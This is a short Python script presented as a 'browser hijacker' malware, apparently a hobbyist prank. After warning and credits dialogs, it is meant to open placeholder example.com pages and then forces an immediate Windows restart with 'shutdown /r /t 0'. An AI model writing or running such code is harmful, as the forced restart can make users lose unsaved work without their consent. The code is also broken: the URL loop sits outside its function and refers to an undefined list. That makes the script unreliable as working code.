import webbrowser
import os 
from tkinter import messagebox
import time 


def warning_message():
  # Warning message before running malware
  messagebox.showwarning("WARNING", "This is a Browser Hijacker, a type of Malware! Do you still want to run this? If not, close the Terminal window. The X button will not work!")
  messagebox.showinfo("Credits","Demon History...Created by Chickenthe4th...Programed in Python...Version 1")
  


def OpenURLs():
  # List of URLs the malware will open
  URLS = [
    "https://example.com/",
    "https://example.com/",
    "https://example.com/"
  ]
  
for url in URLS:
  webbrowser.open(url)

def Shutdown_PC():
  #Shutdown PC after URLs open
  
  time.sleep(2)
  os.system("shutdown /r /t 0")

def main():
  warning_message()
  OpenURLs()
  Shutdown_PC()

if __name__ == "__main__":
  main()
  

